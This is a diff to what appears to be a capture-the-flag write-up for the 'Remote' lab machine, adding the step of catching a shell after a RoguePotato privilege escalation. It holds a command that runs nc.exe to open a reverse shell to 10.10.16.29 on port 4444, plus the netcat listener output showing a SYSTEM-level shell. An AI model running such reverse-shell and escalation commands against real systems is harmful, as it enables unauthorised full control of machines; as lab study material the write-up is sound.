@@ -53,3 +53,23 @@ rogue.exe -r 10.10.16.29 -e "c:\users\public\desktop\nc.exe 10.10.16.29 4444 -e 
 [+] RoguePotato gave you the SYSTEM powerz :D
 
 ```
+
+4. set a netcat listerner and wait for response
+```
+┌──(alienx㉿alienX)-[~/Desktop/MACHINES/REMOTE]
+└─$ nc -nlvp 4444
+listening on [any] 4444 ...
+connect to [10.10.16.29] from (UNKNOWN) [10.10.10.180] 49770
+Microsoft Windows [Version 10.0.17763.107]
+(c) 2018 Microsoft Corporation. All rights reserved.
+
+C:\Users\Public\desktop>whoami
+whoami
+nt authority\system
+
+C:\Users\Public\desktop>
+
+
+```
+
+## WERE DONE WITH ROGUEPOTATO BINARY HOPE U ENJOYED THE SHELL
